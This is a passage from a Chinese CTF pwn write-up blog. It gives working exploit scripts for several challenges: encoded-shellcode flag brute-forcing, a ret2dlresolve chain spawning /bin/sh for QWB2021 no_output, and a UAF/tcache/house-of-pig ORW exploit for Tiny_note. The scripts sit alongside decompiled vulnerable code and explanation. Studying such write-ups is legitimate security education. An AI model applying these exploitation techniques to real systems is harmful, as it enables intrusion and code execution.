rax</span></span><br><span class="line"><span class="string">        retf</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    shellcode_retfa_to_x64=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        push 0x33</span></span><br><span class="line"><span class="string">        push 0x20030</span></span><br><span class="line"><span class="string">        retf</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    shellcode_open_x86=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov esp,0x200a0</span></span><br><span class="line"><span class="string">        /*open(&quot;flag&quot;,0)*/</span></span><br><span class="line"><span class="string">        push 0x67616c66</span></span><br><span class="line"><span class="string">        mov ebx, esp</span></span><br><span class="line"><span class="string">        xor ecx,ecx</span></span><br><span class="line"><span class="string">        xor edx,edx</span></span><br><span class="line"><span class="string">        mov eax,0x5</span></span><br><span class="line"><span class="string">        int 0x80</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    shellcode=shellcode_mmap+shellcode_read+shellcode_retfq_to_x86</span><br><span class="line">    shellcode=asm(shellcode,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">    shellcode_x86=shellcode_open_x86+shellcode_retfa_to_x64</span><br><span class="line">    shellcode_x86=asm(shellcode_x86)</span><br><span class="line">    shellcode_x86=shellcode_x86.ljust(<span class="number">0x30</span>,<span class="string">&#x27;\x90&#x27;</span>)</span><br><span class="line">    shellcode_x86+=asm(shellcode_read_flag_x64,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">    encshellcode=AE64().encode(shellcode,<span class="string">&#x27;rbx&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io.sendline(encshellcode)</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment">#gdb.attach(io)</span></span><br><span class="line">        io.send(shellcode_x86)</span><br><span class="line">        io.recv(timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(flag)&lt;<span class="number">0x30</span>:</span><br><span class="line">    <span class="keyword">for</span> C <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7F</span>):</span><br><span class="line">        io=process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span>(pwn(io, <span class="built_in">len</span>(flag), C)):</span><br><span class="line">            flag+=<span class="built_in">chr</span>(C)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span>    </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag = &quot;flag&quot;</span></span><br><span class="line"><span class="string">hex_flag = &quot;&quot;</span></span><br><span class="line"><span class="string">hex_sh = &quot;&quot;</span></span><br><span class="line"><span class="string">for i in flag[::-1]:</span></span><br><span class="line"><span class="string">        hex_flag += str(hex(ord(i)))</span></span><br><span class="line"><span class="string">for i in binsh[::-1]:</span></span><br><span class="line"><span class="string">        hex_sh += str(hex(ord(i)))</span></span><br><span class="line"><span class="string">hex_flag = &quot;0x&quot;+hex_flag.replace(&quot;0x&quot;,&quot;&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="0xA-QWB2021-no-output【浮点异常触发，ret2dlresolve】"><a href="#0xA-QWB2021-no-output【浮点异常触发，ret2dlresolve】" class="headerlink" title="0xA.QWB2021 no_output【浮点异常触发，ret2dlresolve】"></a>0xA.QWB2021 no_output【浮点异常触发，ret2dlresolve】</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_804930B</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  result = open(<span class="string">&quot;real_flag.txt&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  flag_fd = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先初始化，打开flag文件</p><p><a href="https://imgtu.com/i/vp2cCt"><img src="https://s1.ax1x.com/2022/07/27/vp2cCt.png" alt="vp2cCt.png"></a></p><p>然后往buf中读入0x30的数据，往src中读入0x20的数据，将src的数据拷贝到dest中</p><p><a href="https://imgtu.com/i/vp2hDg"><img src="https://s1.ax1x.com/2022/07/27/vp2hDg.png" alt="vp2hDg.png"></a></p><p>dest的大小也为0x20，并且紧邻着flag_fd。</p><p>strcpy之后，就会从flag_fd中往src中读入0x20的数据</p><p><a href="https://imgtu.com/i/vp2zVJ"><img src="https://s1.ax1x.com/2022/07/27/vp2zVJ.png" alt="vp2zVJ.png"></a></p><p>之后程序会比较src是否为hello_boy，不为hello_boy的话就退出。这里就需要通过strcpy将flag_fd覆盖为0，是我们能够往src中写入数据。</p><p><a href="https://imgtu.com/i/vpReVH"><img src="https://s1.ax1x.com/2022/07/27/vpReVH.png" alt="vpReVH.png"></a></p><p>signal的handler函数是一个栈溢出函数，信号量8代表着浮点异常，通常无穷大除0可以触发浮点异常，不过这里除数不能为0，所以采用无穷小除负一来触发。触发之后进入一个很大的栈溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sub_8049236</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如题目所说，这题没有输出函数，所以使用ret2dlresolve。</p><p>pwntools很贴心的为我们准备好了ret2dl的构造模板，exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">rop=ROP(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.send(<span class="string">&#x27;hello_boy&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;-2147483648&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dl_resolve=Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&#x27;/bin/sh&#x27;</span>])</span><br><span class="line">rop.read(<span class="number">0</span>,dl_resolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dl_resolve)</span><br><span class="line">info(rop.dump())</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.send(fit(&#123;<span class="number">0x4c</span>:rop.chain(),<span class="number">0x100</span>:dl_resolve.payload&#125;))<span class="comment">#在0x4c处写入rop链，在0x100处写入dl_resolve的payload</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0xB-西湖论剑2021-Tiny-note-【UAF，tcache-perthread-struct控制，fastbin-reverse-into-tcache任意地址写，house-of-pig】"><a href="#0xB-西湖论剑2021-Tiny-note-【UAF，tcache-perthread-struct控制，fastbin-reverse-into-tcache任意地址写，house-of-pig】" class="headerlink" title="0xB.西湖论剑2021 Tiny_note 【UAF，tcache_perthread_struct控制，fastbin_reverse_into_tcache任意地址写，house of pig】"></a>0xB.西湖论剑2021 Tiny_note 【UAF，tcache_perthread_struct控制，fastbin_reverse_into_tcache任意地址写，house of pig】</h2><p>很牛逼的一题</p><p><a href="https://imgtu.com/i/vCyMFI"><img src="https://s1.ax1x.com/2022/07/28/vCyMFI.png" alt="vCyMFI.png"></a></p><p>开了沙箱，四个功能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_141E</span><span class="params">(<span class="type">size_t</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = (<span class="type">unsigned</span> __int64)<span class="built_in">malloc</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( (v2 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL) == unk_4038 )</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>add功能只允许申请0x10的chunk，而且只能申请序号为0到2的chunk(但这并不影响我们的利用，因为并不会检测序号是否已经使用，所以同一个序号能够申请任意数量的chunk)并且限制了申请到的堆地址在一页内，也就是说不能通过add功能申请到malloc_hook，free_hook或是其他一些常用的内存。</p><p>show功能通过write将chunk的内容输出来。</p><p>edit功能对chunk内容进行修改。</p><p>dele功能存在UAF漏洞。</p><p>这题无法任意地址分配，就只能用任意地址写来利用IO_FILE。通常我们的任意地址写是利用largebin attack或者smallbin attack来实现的，而这题只能申请0x20的chunk，该如何利用这么小的堆块实现任意地址写？</p><p>高版本libc有一个stash机制，就是当tcache没满并且fastbin有chunk时，从fastbin中取出一个chunk后，会将fastbin中剩下的chunk逆序放入tcache中，这种利用方法又叫做fastbin_reverse_into_tcache，一般是用来解除fastbin分配的地址限制。但除了能够达成任意内存申请的作用外，fastbin_reverse_into_tcache还能往任意内存中写入一个地址。</p><p>假设fastbin中存在这样一条链：chunk0-&gt;chunk1-&gt;chunk2-&gt;victim。tcache为空，当我们从fastbin中取出chunk0时，剩余的chunk就会被链入tcache中，变成如下所示：</p><p>tcache:victim-&gt;chunk2-&gt;chunk1.</p><p>也就是victim的fd指针会被设置为chunk2的地址(注意，libc2.32以上fd指针是加密的)，bk指针会被写为tcache_struct的地址。也就是说，如果victim的地址为target，那么stash之后，target+0x10处就会被写入一个加密的堆地址 ，target+0x18处就会写入一个正常的堆地址，这样也就实现了一个任意地址写一个堆地址。剩下的就是打IO_FILE了。</p><p>整体思路为：</p><p>1.先通过uaf泄露堆地址，再通过uaf改大chunksize，得到libc地址。</p><p>2.通过uaf控制tcache_perthread_struct结构体，由于chunk大小只有0x10，所以我们要控制0x10的tcache的链表头和数量就需要两次uaf，分别控制链表头和链表数量。</p><p>3.由于高版本的libc下tcache的fd指针会被加密，所以不能用fd指针来任意地址写，只能用bk指针。但高版本的libc下tcache的写入需要0x10对齐，所以没办法直接往io_list_all中写入bk。io_list_all没法写，可以往chain中写，chain在IO_FILE中的偏移为0x68，io_list_all指向的是stderr的FILE结构体</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all </span><br><span class="line"><span class="variable">$2</span> = (struct _IO_FILE_plus *) 0x7ffff7fb85e0 &lt;_IO_2_1_stderr_&gt;</span><br></pre></td></tr></table></figure><p>将stderr结构体的chain修改为tcache_perthread_struct的地址，然后我们在tcache_perthread_struct中构造好FILE结构体的各项数据。</p><p>在这一步中使用fastbin_reverse_into_tcache，利用UAF将fastbin的最后一个chunk修改为&amp;io_list_all+0x70，这样fastbin_reverse_into_tcache之后就会将stderr的chain修改为tcache_perthread_struct的地址。</p><p>4.house of pig。house of pig会申请一个chunk，这个chunk的大小为<code>2*((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)+ 100 </code>，至少为100，申请到这个chunk之后，如果<code>_IO_buf_base</code>指向的区域有数据，还会将这些数据拷贝到新的chunk中。确定好了要申请的chunk的大小后，修改tcache_perthread_struct中对应的tcache链表头为free_hook，然后再进行一些必要的设置，比如orw链的构造等等。</p><p>5.通过改小topchuhnk的size，并且将previnuse位置0，然后申请一个大于topchunk的size，触发io_str_overflow，进行house of pig</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./TinyNote&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.33.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(index))    </span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">heap_base=u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base=heap_base&lt;&lt;<span class="number">12</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">heap_addr=heap_base+<span class="number">0x2b0</span></span><br><span class="line">payload=heap_addr^(heap_base&gt;&gt;<span class="number">12</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(payload))</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x21</span>):</span><br><span class="line">    add(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1e0c00</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">io_list_all_addr=libc_base+<span class="number">0x1e15c0</span></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">setcontext_addr=libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">io_str_jumps_addr=libc_base+<span class="number">0x1e2560</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x000000000002a4cf</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x0000000000028a55</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x00000000000c7f32</span></span><br><span class="line">ret=libc_base+<span class="number">0x0000000000026699</span></span><br><span class="line">pcop=libc_base+<span class="number">0x14a0a0</span></span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr=libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">heap_addr=heap_base+<span class="number">0x10</span></span><br><span class="line">payload=(heap_addr^((heap_base+<span class="number">0x2e0</span>)&gt;&gt;<span class="number">12</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(payload))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p8(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p8(<span class="number">2</span>))</span><br><span class="line">heap_addr=heap_base+<span class="number">0x90</span></span><br><span class="line">payload=(heap_addr^((heap_base+<span class="number">0x300</span>)&gt;&gt;<span class="number">12</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(payload))</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line">    add(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(i))</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload=((io_list_all_addr+<span class="number">0x70</span>)^((heap_base+<span class="number">0x410</span>)&gt;&gt;<span class="number">12</span>))</span><br><span class="line">edit(<span class="number">2</span>,p64(payload))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">7</span>))</span><br><span class="line">    dele(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">6</span>-i))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(io_list_all_addr&gt;&gt;<span class="number">12</span>))</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">addr,content</span>):</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">1</span>))</span><br><span class="line">    edit(<span class="number">1</span>,p64(addr))</span><br><span class="line">    add(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">2</span>,content)</span><br><span class="line"></span><br><span class="line">length=<span class="number">0x2a0</span></span><br><span class="line">start=heap_base+<span class="number">0x6c0</span></span><br><span class="line">end = start + ((length) - <span class="number">100</span>)//<span class="number">2</span></span><br><span class="line">change(heap_base+<span class="number">0x30</span>,p64(<span class="number">1</span>)+p64(heap_base+<span class="number">0x440</span>)) </span><br><span class="line">change(heap_base+<span class="number">0x40</span>,p64(<span class="number">0</span>)+p64(start))</span><br><span class="line">change(heap_base+<span class="number">0x50</span>,p64(end))</span><br><span class="line">change(heap_base+<span class="number">0x60</span>,p64(<span class="number">0x10000</span>))</span><br><span class="line">change(heap_base+<span class="number">0xd0</span>,p64(<span class="number">0</span>))</span><br><span class="line">change(heap_base+<span class="number">0xe0</span>,p64(<span class="number">0</span>)+p64(io_str_jumps_addr))</span><br><span class="line">change(heap_base+<span class="number">0x1d0</span>,p64(<span class="number">0</span>)+p64(free_hook))</span><br><span class="line">change(heap_base+<span class="number">0x6c0</span>,p64(pcop)+p64(heap_base+<span class="number">0x440</span>-<span class="number">0x20</span>))</span><br><span class="line">change(heap_base+<span class="number">0x440</span>,p64(setcontext_addr+<span class="number">61</span>))</span><br><span class="line">change(heap_base+<span class="number">0x420</span>+<span class="number">0xa0</span>,p64(heap_base+<span class="number">0x4f0</span>)+p64(ret))</span><br><span class="line">change(heap_base+<span class="number">0x4f0</span>,p64(pop_rdi)+p64(heap_base+<span class="number">0x6a0</span>))</span><br><span class="line">change(heap_base+<span class="number">0x500</span>,p64(pop_rsi)+p64(<span class="number">0</span>))</span><br><span class="line">change(heap_base+<span class="number">0x510</span>,p64(open_addr)+p64(pop_rdi))</span><br><span class="line">change(heap_base+<span class="number">0x520</span>,p64(<span class="number">3</span>)+p64(pop_rsi))</span><br><span class="line">change(heap_base+<span class="number">0x530</span>,p64(heap_base+<span class="number">0x2a0</span>)+p64(pop_rdx))</span><br><span class="line">change(heap_base+<span class="number">0x540</span>,p64(<span class="number">0x30</span>)+p64(read_addr))</span><br><span class="line">change(heap_base+<span class="number">0x550</span>,p64(pop_rdi)+p64(<span class="number">1</span>))</span><br><span class="line">change(heap_base+<span class="number">0x560</span>,p64(pop_rsi)+p64(heap_base+<span class="number">0x2a0</span>))</span><br><span class="line">change(heap_base+<span class="number">0x570</span>,p64(write_addr))</span><br><span class="line">change(heap_base+<span class="number">0x6a0</span>,<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">1</span>))</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0xC-RCTF2020-no-write【magic-gadget，ret2csu，-strncmp-sse42进行侧信道爆破flag】"><a href="#0xC-RCTF2020-no-write【magic-gadget，ret2csu，-strncmp-sse42进行侧信道爆破flag】" class="headerlink" title="0xC.RCTF2020 no_write【magic_gadget，ret2csu，__strncmp_sse42进行侧信道爆破flag】"></a>0xC.RCTF2020 no_write【magic_gadget，ret2csu，__strncmp_sse42进行侧信道爆破flag】</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  read_n(v4, <span class="number">256LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 